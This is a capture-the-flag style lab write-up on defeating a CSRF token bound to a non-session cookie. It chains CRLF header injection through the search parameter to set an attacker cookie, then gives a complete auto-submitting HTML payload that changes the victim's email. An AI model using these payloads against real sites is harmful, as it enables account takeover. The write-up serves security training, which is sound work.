
# Lab: CSRF where token is tied to non-session cookie

## idea 
Here our csrf token is bind with a special cookie called **csrfkey**, in order to bypass this protection we need to 
inject our cookie in the  browser of the victim and then trigger the CSRF.

## exploitation

CSRF chain with CRLF vulnerability.
The search functionality add the last search string in a cookie named **LastSearchTerm**. Thanks to this functionality we can add extra headers.
In our case we need to add our "csrfKey=WeyIERiCXa9KiHb6IQxZclcnhIHyYDua" cookie. 
During my first attempt i try to simply add my cookie like that : 

https://MYLAB.web-security-academy.net/?search=;%0a%0dcsrfKey=WeyIERiCXa9KiHb6IQxZclcnhIHyYDua

But it don't work because ";" get remove and without escaping the current cookie LastSearchTerm with ";" , the added cookie (csrfKey=WeyIERiCXa9KiHb6IQxZclcnhIHyYDua)
is interpreted as a string.

After a few try and search , i found out that we can use "Set-cookie" in order to add our cookie:

https://MYLAB.web-security-academy.net/?search=%0a%0dSet-Cookie:%20csrfKey=WeyIERiCXa9KiHb6IQxZclcnhIHyYDua

Now we need to build our payload and to do so like the lab2 we can use img tag to send a first request to set our **csrfkey** cookie to the victim.
Once the cookie is set , we can send the form in order to change the password.


## payload :
```html
<form id="mon-formulaire" name="change-email-form" action="https://MYLAB.web-security-academy.net/my-account/change-email" method="POST">
    <input required type="email" name="email" value="evilWiener@gmail.re">
    <input required type=hidden name=csrf value="ppElrsAGnnmWGYquewpRzzdM0nwlUIaJ">
</form>

<script>
    let formulaire = document.getElementById("mon-formulaire");
</script>


<img src="https://MYLAB.web-security-academy.net/?search=%0a%0dSet-Cookie:%20csrfKey=WeyIERiCXa9KiHb6IQxZclcnhIHyYDua" onerror=formulaire.submit()>

```
